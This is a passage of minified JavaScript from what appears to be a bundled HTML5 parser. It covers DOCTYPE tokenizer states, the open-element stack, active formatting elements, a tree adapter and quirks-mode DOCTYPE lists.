y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:{this.state=x.AFTER_DOCTYPE_NAME;break}case y.GREATER_THAN_SIGN:{this.state=x.DATA,this.emitCurrentDoctype(r);break}case y.NULL:{this._err(W.unexpectedNullCharacter),r.name+=Ve;break}case y.EOF:{this._err(W.eofInDoctype),r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:r.name+=String.fromCodePoint(ba(t)?uo(t):t)}}_stateAfterDoctypeName(t){const r=this.currentToken;switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:break;case y.GREATER_THAN_SIGN:{this.state=x.DATA,this.emitCurrentDoctype(r);break}case y.EOF:{this._err(W.eofInDoctype),r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:this._consumeSequenceIfMatch(Pt.PUBLIC,!1)?this.state=x.AFTER_DOCTYPE_PUBLIC_KEYWORD:this._consumeSequenceIfMatch(Pt.SYSTEM,!1)?this.state=x.AFTER_DOCTYPE_SYSTEM_KEYWORD:this._ensureHibernation()||(this._err(W.invalidCharacterSequenceAfterDoctypeName),r.forceQuirks=!0,this.state=x.BOGUS_DOCTYPE,this._stateBogusDoctype(t))}}_stateAfterDoctypePublicKeyword(t){const r=this.currentToken;switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:{this.state=x.BEFORE_DOCTYPE_PUBLIC_IDENTIFIER;break}case y.QUOTATION_MARK:{this._err(W.missingWhitespaceAfterDoctypePublicKeyword),r.publicId="",this.state=x.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED;break}case y.APOSTROPHE:{this._err(W.missingWhitespaceAfterDoctypePublicKeyword),r.publicId="",this.state=x.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED;break}case y.GREATER_THAN_SIGN:{this._err(W.missingDoctypePublicIdentifier),r.forceQuirks=!0,this.state=x.DATA,this.emitCurrentDoctype(r);break}case y.EOF:{this._err(W.eofInDoctype),r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:this._err(W.missingQuoteBeforeDoctypePublicIdentifier),r.forceQuirks=!0,this.state=x.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateBeforeDoctypePublicIdentifier(t){const r=this.currentToken;switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:break;case y.QUOTATION_MARK:{r.publicId="",this.state=x.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED;break}case y.APOSTROPHE:{r.publicId="",this.state=x.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED;break}case y.GREATER_THAN_SIGN:{this._err(W.missingDoctypePublicIdentifier),r.forceQuirks=!0,this.state=x.DATA,this.emitCurrentDoctype(r);break}case y.EOF:{this._err(W.eofInDoctype),r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:this._err(W.missingQuoteBeforeDoctypePublicIdentifier),r.forceQuirks=!0,this.state=x.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateDoctypePublicIdentifierDoubleQuoted(t){const r=this.currentToken;switch(t){case y.QUOTATION_MARK:{this.state=x.AFTER_DOCTYPE_PUBLIC_IDENTIFIER;break}case y.NULL:{this._err(W.unexpectedNullCharacter),r.publicId+=Ve;break}case y.GREATER_THAN_SIGN:{this._err(W.abruptDoctypePublicIdentifier),r.forceQuirks=!0,this.emitCurrentDoctype(r),this.state=x.DATA;break}case y.EOF:{this._err(W.eofInDoctype),r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:r.publicId+=String.fromCodePoint(t)}}_stateDoctypePublicIdentifierSingleQuoted(t){const r=this.currentToken;switch(t){case y.APOSTROPHE:{this.state=x.AFTER_DOCTYPE_PUBLIC_IDENTIFIER;break}case y.NULL:{this._err(W.unexpectedNullCharacter),r.publicId+=Ve;break}case y.GREATER_THAN_SIGN:{this._err(W.abruptDoctypePublicIdentifier),r.forceQuirks=!0,this.emitCurrentDoctype(r),this.state=x.DATA;break}case y.EOF:{this._err(W.eofInDoctype),r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:r.publicId+=String.fromCodePoint(t)}}_stateAfterDoctypePublicIdentifier(t){const r=this.currentToken;switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:{this.state=x.BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS;break}case y.GREATER_THAN_SIGN:{this.state=x.DATA,this.emitCurrentDoctype(r);break}case y.QUOTATION_MARK:{this._err(W.missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers),r.systemId="",this.state=x.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED;break}case y.APOSTROPHE:{this._err(W.missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers),r.systemId="",this.state=x.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED;break}case y.EOF:{this._err(W.eofInDoctype),r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:this._err(W.missingQuoteBeforeDoctypeSystemIdentifier),r.forceQuirks=!0,this.state=x.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateBetweenDoctypePublicAndSystemIdentifiers(t){const r=this.currentToken;switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:break;case y.GREATER_THAN_SIGN:{this.emitCurrentDoctype(r),this.state=x.DATA;break}case y.QUOTATION_MARK:{r.systemId="",this.state=x.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED;break}case y.APOSTROPHE:{r.systemId="",this.state=x.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED;break}case y.EOF:{this._err(W.eofInDoctype),r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:this._err(W.missingQuoteBeforeDoctypeSystemIdentifier),r.forceQuirks=!0,this.state=x.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateAfterDoctypeSystemKeyword(t){const r=this.currentToken;switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:{this.state=x.BEFORE_DOCTYPE_SYSTEM_IDENTIFIER;break}case y.QUOTATION_MARK:{this._err(W.missingWhitespaceAfterDoctypeSystemKeyword),r.systemId="",this.state=x.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED;break}case y.APOSTROPHE:{this._err(W.missingWhitespaceAfterDoctypeSystemKeyword),r.systemId="",this.state=x.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED;break}case y.GREATER_THAN_SIGN:{this._err(W.missingDoctypeSystemIdentifier),r.forceQuirks=!0,this.state=x.DATA,this.emitCurrentDoctype(r);break}case y.EOF:{this._err(W.eofInDoctype),r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:this._err(W.missingQuoteBeforeDoctypeSystemIdentifier),r.forceQuirks=!0,this.state=x.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateBeforeDoctypeSystemIdentifier(t){const r=this.currentToken;switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:break;case y.QUOTATION_MARK:{r.systemId="",this.state=x.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED;break}case y.APOSTROPHE:{r.systemId="",this.state=x.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED;break}case y.GREATER_THAN_SIGN:{this._err(W.missingDoctypeSystemIdentifier),r.forceQuirks=!0,this.state=x.DATA,this.emitCurrentDoctype(r);break}case y.EOF:{this._err(W.eofInDoctype),r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:this._err(W.missingQuoteBeforeDoctypeSystemIdentifier),r.forceQuirks=!0,this.state=x.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateDoctypeSystemIdentifierDoubleQuoted(t){const r=this.currentToken;switch(t){case y.QUOTATION_MARK:{this.state=x.AFTER_DOCTYPE_SYSTEM_IDENTIFIER;break}case y.NULL:{this._err(W.unexpectedNullCharacter),r.systemId+=Ve;break}case y.GREATER_THAN_SIGN:{this._err(W.abruptDoctypeSystemIdentifier),r.forceQuirks=!0,this.emitCurrentDoctype(r),this.state=x.DATA;break}case y.EOF:{this._err(W.eofInDoctype),r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:r.systemId+=String.fromCodePoint(t)}}_stateDoctypeSystemIdentifierSingleQuoted(t){const r=this.currentToken;switch(t){case y.APOSTROPHE:{this.state=x.AFTER_DOCTYPE_SYSTEM_IDENTIFIER;break}case y.NULL:{this._err(W.unexpectedNullCharacter),r.systemId+=Ve;break}case y.GREATER_THAN_SIGN:{this._err(W.abruptDoctypeSystemIdentifier),r.forceQuirks=!0,this.emitCurrentDoctype(r),this.state=x.DATA;break}case y.EOF:{this._err(W.eofInDoctype),r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:r.systemId+=String.fromCodePoint(t)}}_stateAfterDoctypeSystemIdentifier(t){const r=this.currentToken;switch(t){case y.SPACE:case y.LINE_FEED:case y.TABULATION:case y.FORM_FEED:break;case y.GREATER_THAN_SIGN:{this.emitCurrentDoctype(r),this.state=x.DATA;break}case y.EOF:{this._err(W.eofInDoctype),r.forceQuirks=!0,this.emitCurrentDoctype(r),this._emitEOFToken();break}default:this._err(W.unexpectedCharacterAfterDoctypeSystemIdentifier),this.state=x.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateBogusDoctype(t){const r=this.currentToken;switch(t){case y.GREATER_THAN_SIGN:{this.emitCurrentDoctype(r),this.state=x.DATA;break}case y.NULL:{this._err(W.unexpectedNullCharacter);break}case y.EOF:{this.emitCurrentDoctype(r),this._emitEOFToken();break}}}_stateCdataSection(t){switch(t){case y.RIGHT_SQUARE_BRACKET:{this.state=x.CDATA_SECTION_BRACKET;break}case y.EOF:{this._err(W.eofInCdata),this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateCdataSectionBracket(t){t===y.RIGHT_SQUARE_BRACKET?this.state=x.CDATA_SECTION_END:(this._emitChars("]"),this.state=x.CDATA_SECTION,this._stateCdataSection(t))}_stateCdataSectionEnd(t){switch(t){case y.GREATER_THAN_SIGN:{this.state=x.DATA;break}case y.RIGHT_SQUARE_BRACKET:{this._emitChars("]");break}default:this._emitChars("]]"),this.state=x.CDATA_SECTION,this._stateCdataSection(t)}}_stateCharacterReference(){let t=this.entityDecoder.write(this.preprocessor.html,this.preprocessor.pos);if(t<0)if(this.preprocessor.lastChunkWritten)t=this.entityDecoder.end();else{this.active=!1,this.preprocessor.pos=this.preprocessor.html.length-1,this.consumedAfterSnapshot=0,this.preprocessor.endOfChunkHit=!0;return}t===0?(this.preprocessor.pos=this.entityStartPos,this._flushCodePointConsumedAsCharacterReference(y.AMPERSAND),this.state=!this._isCharacterReferenceInAttribute()&&Mh(this.preprocessor.peek(1))?x.AMBIGUOUS_AMPERSAND:this.returnState):this.state=this.returnState}_stateAmbiguousAmpersand(t){Mh(t)?this._flushCodePointConsumedAsCharacterReference(t):(t===y.SEMICOLON&&this._err(W.unknownNamedCharacterReference),this.state=this.returnState,this._callState(t))}}const Em=new Set([d.DD,d.DT,d.LI,d.OPTGROUP,d.OPTION,d.P,d.RB,d.RP,d.RT,d.RTC]),Bh=new Set([...Em,d.CAPTION,d.COLGROUP,d.TBODY,d.TD,d.TFOOT,d.TH,d.THEAD,d.TR]),To=new Set([d.APPLET,d.CAPTION,d.HTML,d.MARQUEE,d.OBJECT,d.TABLE,d.TD,d.TEMPLATE,d.TH]),Ux=new Set([...To,d.OL,d.UL]),zx=new Set([...To,d.BUTTON]),Hh=new Set([d.ANNOTATION_XML,d.MI,d.MN,d.MO,d.MS,d.MTEXT]),Uh=new Set([d.DESC,d.FOREIGN_OBJECT,d.TITLE]),Wx=new Set([d.TR,d.TEMPLATE,d.HTML]),jx=new Set([d.TBODY,d.TFOOT,d.THEAD,d.TEMPLATE,d.HTML]),Qx=new Set([d.TABLE,d.TEMPLATE,d.HTML]),Yx=new Set([d.TD,d.TH]);class Xx{get currentTmplContentOrNode(){return this._isInTemplate()?this.treeAdapter.getTemplateContent(this.current):this.current}constructor(t,r,a){this.treeAdapter=r,this.handler=a,this.items=[],this.tagIDs=[],this.stackTop=-1,this.tmplCount=0,this.currentTagId=d.UNKNOWN,this.current=t}_indexOf(t){return this.items.lastIndexOf(t,this.stackTop)}_isInTemplate(){return this.currentTagId===d.TEMPLATE&&this.treeAdapter.getNamespaceURI(this.current)===V.HTML}_updateCurrentElement(){this.current=this.items[this.stackTop],this.currentTagId=this.tagIDs[this.stackTop]}push(t,r){this.stackTop++,this.items[this.stackTop]=t,this.current=t,this.tagIDs[this.stackTop]=r,this.currentTagId=r,this._isInTemplate()&&this.tmplCount++,this.handler.onItemPush(t,r,!0)}pop(){const t=this.current;this.tmplCount>0&&this._isInTemplate()&&this.tmplCount--,this.stackTop--,this._updateCurrentElement(),this.handler.onItemPop(t,!0)}replace(t,r){const a=this._indexOf(t);this.items[a]=r,a===this.stackTop&&(this.current=r)}insertAfter(t,r,a){const o=this._indexOf(t)+1;this.items.splice(o,0,r),this.tagIDs.splice(o,0,a),this.stackTop++,o===this.stackTop&&this._updateCurrentElement(),this.current&&this.currentTagId!==void 0&&this.handler.onItemPush(this.current,this.currentTagId,o===this.stackTop)}popUntilTagNamePopped(t){let r=this.stackTop+1;do r=this.tagIDs.lastIndexOf(t,r-1);while(r>0&&this.treeAdapter.getNamespaceURI(this.items[r])!==V.HTML);this.shortenToLength(Math.max(r,0))}shortenToLength(t){for(;this.stackTop>=t;){const r=this.current;this.tmplCount>0&&this._isInTemplate()&&(this.tmplCount-=1),this.stackTop--,this._updateCurrentElement(),this.handler.onItemPop(r,this.stackTop<t)}}popUntilElementPopped(t){const r=this._indexOf(t);this.shortenToLength(Math.max(r,0))}popUntilPopped(t,r){const a=this._indexOfTagNames(t,r);this.shortenToLength(Math.max(a,0))}popUntilNumberedHeaderPopped(){this.popUntilPopped(pc,V.HTML)}popUntilTableCellPopped(){this.popUntilPopped(Yx,V.HTML)}popAllUpToHtmlElement(){this.tmplCount=0,this.shortenToLength(1)}_indexOfTagNames(t,r){for(let a=this.stackTop;a>=0;a--)if(t.has(this.tagIDs[a])&&this.treeAdapter.getNamespaceURI(this.items[a])===r)return a;return-1}clearBackTo(t,r){const a=this._indexOfTagNames(t,r);this.shortenToLength(a+1)}clearBackToTableContext(){this.clearBackTo(Qx,V.HTML)}clearBackToTableBodyContext(){this.clearBackTo(jx,V.HTML)}clearBackToTableRowContext(){this.clearBackTo(Wx,V.HTML)}remove(t){const r=this._indexOf(t);r>=0&&(r===this.stackTop?this.pop():(this.items.splice(r,1),this.tagIDs.splice(r,1),this.stackTop--,this._updateCurrentElement(),this.handler.onItemPop(t,!1)))}tryPeekProperlyNestedBodyElement(){return this.stackTop>=1&&this.tagIDs[1]===d.BODY?this.items[1]:null}contains(t){return this._indexOf(t)>-1}getCommonAncestor(t){const r=this._indexOf(t)-1;return r>=0?this.items[r]:null}isRootHtmlElementCurrent(){return this.stackTop===0&&this.tagIDs[0]===d.HTML}hasInDynamicScope(t,r){for(let a=this.stackTop;a>=0;a--){const o=this.tagIDs[a];switch(this.treeAdapter.getNamespaceURI(this.items[a])){case V.HTML:{if(o===t)return!0;if(r.has(o))return!1;break}case V.SVG:{if(Uh.has(o))return!1;break}case V.MATHML:{if(Hh.has(o))return!1;break}}}return!0}hasInScope(t){return this.hasInDynamicScope(t,To)}hasInListItemScope(t){return this.hasInDynamicScope(t,Ux)}hasInButtonScope(t){return this.hasInDynamicScope(t,zx)}hasNumberedHeaderInScope(){for(let t=this.stackTop;t>=0;t--){const r=this.tagIDs[t];switch(this.treeAdapter.getNamespaceURI(this.items[t])){case V.HTML:{if(pc.has(r))return!0;if(To.has(r))return!1;break}case V.SVG:{if(Uh.has(r))return!1;break}case V.MATHML:{if(Hh.has(r))return!1;break}}}return!0}hasInTableScope(t){for(let r=this.stackTop;r>=0;r--)if(this.treeAdapter.getNamespaceURI(this.items[r])===V.HTML)switch(this.tagIDs[r]){case t:return!0;case d.TABLE:case d.HTML:return!1}return!0}hasTableBodyContextInTableScope(){for(let t=this.stackTop;t>=0;t--)if(this.treeAdapter.getNamespaceURI(this.items[t])===V.HTML)switch(this.tagIDs[t]){case d.TBODY:case d.THEAD:case d.TFOOT:return!0;case d.TABLE:case d.HTML:return!1}return!0}hasInSelectScope(t){for(let r=this.stackTop;r>=0;r--)if(this.treeAdapter.getNamespaceURI(this.items[r])===V.HTML)switch(this.tagIDs[r]){case t:return!0;case d.OPTION:case d.OPTGROUP:break;default:return!1}return!0}generateImpliedEndTags(){for(;this.currentTagId!==void 0&&Em.has(this.currentTagId);)this.pop()}generateImpliedEndTagsThoroughly(){for(;this.currentTagId!==void 0&&Bh.has(this.currentTagId);)this.pop()}generateImpliedEndTagsWithExclusion(t){for(;this.currentTagId!==void 0&&this.currentTagId!==t&&Bh.has(this.currentTagId);)this.pop()}}const Ql=3;var En;(function(e){e[e.Marker=0]="Marker",e[e.Element=1]="Element"})(En||(En={}));const zh={type:En.Marker};class Gx{constructor(t){this.treeAdapter=t,this.entries=[],this.bookmark=null}_getNoahArkConditionCandidates(t,r){const a=[],o=r.length,s=this.treeAdapter.getTagName(t),l=this.treeAdapter.getNamespaceURI(t);for(let h=0;h<this.entries.length;h++){const p=this.entries[h];if(p.type===En.Marker)break;const{element:g}=p;if(this.treeAdapter.getTagName(g)===s&&this.treeAdapter.getNamespaceURI(g)===l){const T=this.treeAdapter.getAttrList(g);T.length===o&&a.push({idx:h,attrs:T})}}return a}_ensureNoahArkCondition(t){if(this.entries.length<Ql)return;const r=this.treeAdapter.getAttrList(t),a=this._getNoahArkConditionCandidates(t,r);if(a.length<Ql)return;const o=new Map(r.map(l=>[l.name,l.value]));let s=0;for(let l=0;l<a.length;l++){const h=a[l];h.attrs.every(p=>o.get(p.name)===p.value)&&(s+=1,s>=Ql&&this.entries.splice(h.idx,1))}}insertMarker(){this.entries.unshift(zh)}pushElement(t,r){this._ensureNoahArkCondition(t),this.entries.unshift({type:En.Element,element:t,token:r})}insertElementAfterBookmark(t,r){const a=this.entries.indexOf(this.bookmark);this.entries.splice(a,0,{type:En.Element,element:t,token:r})}removeEntry(t){const r=this.entries.indexOf(t);r!==-1&&this.entries.splice(r,1)}clearToLastMarker(){const t=this.entries.indexOf(zh);t===-1?this.entries.length=0:this.entries.splice(0,t+1)}getElementEntryInScopeWithTagName(t){const r=this.entries.find(a=>a.type===En.Marker||this.treeAdapter.getTagName(a.element)===t);return r&&r.type===En.Element?r:null}getElementEntry(t){return this.entries.find(r=>r.type===En.Element&&r.element===t)}}const ir={createDocument(){return{nodeName:"#document",mode:Kt.NO_QUIRKS,childNodes:[]}},createDocumentFragment(){return{nodeName:"#document-fragment",childNodes:[]}},createElement(e,t,r){return{nodeName:e,tagName:e,attrs:r,namespaceURI:t,childNodes:[],parentNode:null}},createCommentNode(e){return{nodeName:"#comment",data:e,parentNode:null}},createTextNode(e){return{nodeName:"#text",value:e,parentNode:null}},appendChild(e,t){e.childNodes.push(t),t.parentNode=e},insertBefore(e,t,r){const a=e.childNodes.indexOf(r);e.childNodes.splice(a,0,t),t.parentNode=e},setTemplateContent(e,t){e.content=t},getTemplateContent(e){return e.content},setDocumentType(e,t,r,a){const o=e.childNodes.find(s=>s.nodeName==="#documentType");if(o)o.name=t,o.publicId=r,o.systemId=a;else{const s={nodeName:"#documentType",name:t,publicId:r,systemId:a,parentNode:null};ir.appendChild(e,s)}},setDocumentMode(e,t){e.mode=t},getDocumentMode(e){return e.mode},detachNode(e){if(e.parentNode){const t=e.parentNode.childNodes.indexOf(e);e.parentNode.childNodes.splice(t,1),e.parentNode=null}},insertText(e,t){if(e.childNodes.length>0){const r=e.childNodes[e.childNodes.length-1];if(ir.isTextNode(r)){r.value+=t;return}}ir.appendChild(e,ir.createTextNode(t))},insertTextBefore(e,t,r){const a=e.childNodes[e.childNodes.indexOf(r)-1];a&&ir.isTextNode(a)?a.value+=t:ir.insertBefore(e,ir.createTextNode(t),r)},adoptAttributes(e,t){const r=new Set(e.attrs.map(a=>a.name));for(let a=0;a<t.length;a++)r.has(t[a].name)||e.attrs.push(t[a])},getFirstChild(e){return e.childNodes[0]},getChildNodes(e){return e.childNodes},getParentNode(e){return e.parentNode},getAttrList(e){return e.attrs},getTagName(e){return e.tagName},getNamespaceURI(e){return e.namespaceURI},getTextNodeContent(e){return e.value},getCommentNodeContent(e){return e.data},getDocumentTypeNodeName(e){return e.name},getDocumentTypeNodePublicId(e){return e.publicId},getDocumentTypeNodeSystemId(e){return e.systemId},isTextNode(e){return e.nodeName==="#text"},isCommentNode(e){return e.nodeName==="#comment"},isDocumentTypeNode(e){return e.nodeName==="#documentType"},isElementNode(e){return Object.prototype.hasOwnProperty.call(e,"tagName")},setNodeSourceCodeLocation(e,t){e.sourceCodeLocation=t},getNodeSourceCodeLocation(e){return e.sourceCodeLocation},updateNodeSourceCodeLocation(e,t){e.sourceCodeLocation={...e.sourceCodeLocation,...t}}},Tm="html",Vx="about:legacy-compat",$x="http://www.ibm.com/data/dtd/v11/ibmxhtml1-transitional.dtd",bm=["+//silmaril//dtd html pro v0r11 19970101//","-//as//dtd html 3.0 aswedit + extensions//","-//advasoft ltd//dtd html 3.0 aswedit + extensions//","-//ietf//dtd html 2.0 level 1//","-//ietf//dtd html 2.0 level 2//","-//ietf//dtd html 2.0 strict level 1//","-//ietf//dtd html 2.0 strict level 2//","-//ietf//dtd html 2.0 strict//","-//ietf//dtd html 2.0//","-//ietf//dtd html 2.1e//","-//ietf//dtd html 3.0//","-//ietf//dtd html 3.2 final//","-//ietf//dtd html 3.2//","-//ietf//dtd html 3//","-//ietf//dtd html level 0//","-//ietf//dtd html level 1//","-//ietf//dtd html level 2//","-//ietf//dtd html level 3//","-//ietf//dtd html strict level 0//","-//ietf//dtd html strict level 1//","-//ietf//dtd html strict level 2//","-//ietf//dtd html strict level 3//","-//ietf//dtd html strict//","-//ietf//dtd html//","-//metrius//dtd metrius presentational//","-//microsoft//dtd internet explorer 2.0 html strict//","-//microsoft//dtd internet explorer 2.0 html//","-//microsoft//dtd internet explorer 2.0 tables//","-//microsoft//dtd internet explorer 3.0 html strict//","-//microsoft//dtd internet explorer 3.0 html//","-//microsoft//dtd internet explorer 3.0 tables//","-//netscape comm. corp.//dtd html//","-//netscape comm. corp.//dtd strict html//","-//o'reilly and associates//dtd html 2.0//","-//o'reilly and associates//dtd html extended 1.0//","-//o'reilly and associates//dtd html extended relaxed 1.0//","-//sq//dtd html 2.0 hotmetal + extensions//","-//softquad software//dtd hotmetal pro 6.0::19990601::extensions to html 4.0//","-//softquad//dtd hotmetal pro 4.0::19971010::extensions to html 4.0//","-//spyglass//dtd html 2.0 extended//","-//sun microsystems corp.//dtd hotjava html//","-//sun microsystems corp.//dtd hotjava strict html//","-//w3c//dtd html 3 1995-03-24//","-//w3c//dtd html 3.2 draft//","-//w3c//dtd html 3.2 final//","-//w3c//dtd html 3.2//","-//w3c//dtd html 3.2s draft//","-//w3c//dtd html 4.0 frameset//","-//w3c//dtd html 4.0 transitional//","-//w3c//dtd html experimental 19960712//","-//w3c//dtd html experimental 970421//","-//w3c//dtd w3 html//","-//w3o//dtd w3 html 3.0//","-//webtechs//dtd mozilla html 2.0//","-//webtechs//dtd mozilla html//"],qx=[...bm,"-//w3c//dtd html 4.01 frameset//","-//w3c//dtd html 4.01 transitional//"],Kx=new Set(["-//w3o//dtd w3 html strict 3.0//en//","-/w3c/dtd html 4.0 transitional/en","html"]),_m=["-//w3c//dtd xhtml 1.0 frameset//","-//w3c//dtd xhtml 1.0 transitional//"],Jx=[..._m,"-//w3c//dtd html 4.01 frameset//","-//w3c//dtd html 4.01 transitional//"];function Wh(e,t){return t.some(r=>e.startsWith(r))}function Zx(e){return e.name===Tm&&e.publicId===null&&(e.systemId===null||e.systemId===Vx)}function eA(e){if(e.name!==Tm)return Kt.QUIRKS;const{systemId:t}=e;if(t&&t.toLowerCase()===$x)return Kt.QUIRKS;let{publicId:r}=e;if(r!==null){if(r=r.toLowerCase(),Kx.has(r))return Kt.QUIRKS;let a=t===null?qx:bm;if(Wh(r,a))return Kt.QUIRKS;if(a=t===null?_m:Jx,Wh(r,a))return Kt.LIMITED_QUIRKS}return Kt.NO_QUIRKS}const jh={TEXT_HTML:"text/html",APPLICATION_XML:"application/xhtml+xml"},tA="definitionurl",nA="definitionURL",rA=new Map(["attributeName","attributeType","baseFrequency","baseProfile","calcMode","clipPathUnits","diffuseConstant","edgeMode","filterUnits","glyphRef","gradientTransform","gradientUnits","kernelMatrix","kernelUnitLength","keyPoints","keySplines","keyTimes","lengthAdjust","limitingConeAngle","markerHeight","markerUnits","markerWidth","maskContentUnits","maskUnits","numOctaves","pathLength","patternContentUnits","patternTransform","patternUnits","pointsAtX","pointsAtY","pointsAtZ","preserveAlpha","preserveAspectRatio","primitiveUnits","refX","refY","repeatCount","repeatDur","requiredExtensions","requiredFeatures","specularConstant","specularExponent","spreadMethod","startOffset","stdDeviation","stitchTiles","surfaceScale","systemLanguage","tableValues","targetX","targetY","textLength","viewBox","viewTarget","xChannelSelector","yChannelSelector","zoomAndPan"].map(e=>[e.toLowerCase(),e])),iA=new Map([["xlink:actuate",{prefix:"xlink",name:"actuate",namespace:V.XLINK}],["xlink:arcrole",{prefix:"xlink",name:"arcrole",namespace:V.XLINK}],["xlink:href",{prefix:"xlink",name:"href",namespace:V.XLINK}],["xlink:role",{prefix:"xlink",name:"role",namespace:V.XLINK}],["xlink:show",{prefix:"xlink",name:"show",namespace:V.XLINK}],["xlink:title",{prefix:"xlink",name:"title",namespace:V.XLINK}],["xlink:type",{prefix:"xlink",name:"type",namespace:V.XLINK}],["xml:lang",{prefix:"xml",name:"lang",namespace:V.XML}],["xml:space",{prefix:"xml",name:"space",namespace:V.XML}],["xmlns",{prefix:"",name:"xmlns",namespace:V.XMLNS}],["xmlns:xlink",{prefix:"xmlns",name:"xlink",namespace:V.XMLNS}]]),aA=new Map(["altGlyph","altGlyphDef","altGlyphItem","animateColor","animateMotion","animateTransform","clipPath","feBlend","feColorMatrix","feComponentTransfer","feComposite","feConvolveMatrix","feDiffuseLighting","feDisplacementMap","feDistantLight","feFlood","feFuncA","feFuncB","feFuncG","feFuncR","feGaussianBlur","feImage","feMerge","feMergeNode","feMorphology","feOffset","fePointLight","feSpecularLighting","feSpotLight","feTile","feTurbulence","foreignObject","glyphRef","linearGradient","radialGradient","textPath"].map(e=>[e.toLowerCase(),e])),uA=new Set([d.B,d.BIG,d.BLOCKQUOTE,d.BODY,d.BR,d.CENTER,d.CODE,d.DD,d.DIV,d.DL,d.DT,d.EM,d.EMBED,d.H1,d.H2,d.H3,d.H4,d.H5,d.H6,d.HEAD,d.HR,d.I,d.IMG,d.LI,d.LISTING,d.MENU,d.META,d.NOBR,d.OL,d.P,d.PRE,d.RUBY,d.S,d.SMALL,d.SPAN,d.STRONG,d.STRIKE,d.SUB,d.SUP,d.TABLE,d.TT,d.U,d.UL,d.VAR]);function oA(e){const t=e.tagID;return t===d.FONT&&e.attrs.some(({name:a})=>a===Nr.COLOR||a===Nr.SIZE||a===Nr.FACE)||uA.has(t)}function Sm(e){for(let t=0;t<e.attrs.length;t++)if(e.attrs[t].name===tA){e.attrs[t].name=nA;break}}function ym(e){for(let t=0;t<e.attrs.length;t++){const r=rA.get(e.attrs[t].name);r!=null&&(e.attrs[t].name=r)}}function Pc(e){for(let t=0;t<e.attrs.length;t++){const r=iA.get(e.attrs[t].name);r&&(e.attrs[t].prefix=r.prefix,e.attrs[t].name=r.name,e.attrs[t].namespace=r.namespace)}}function sA(e){const t=aA.get(e.tagName);t!=null&&(e.tagName=t,e.tagID=Ci(e.tagName))}function lA(e,t){return t===V.MATHML&&(e===d.MI||e===d.MO||e===d.MN||e===d.MS||e===d.MTEXT)}function cA(e,t,r){if(t===V.MATHML&&e===d.ANNOTATION_XML){for(let a=0;a<r.length;a++)if(r[a].name===Nr.ENCODING){const o=r[a].value.toLowerCase();return o===jh.TEXT_HTML||o===jh.APPLICATION_XML}}return t===V.SVG&&(e===d.FOREIGN_OBJECT||e===d.DESC||e===d.TITLE)}function dA(e,t,r,a){return(!a||a===V.HTML)&&cA(e,t,r)||(!a||a===V.MATHML)&&lA(e,t)}const fA="hidden",hA=8,pA=3;var 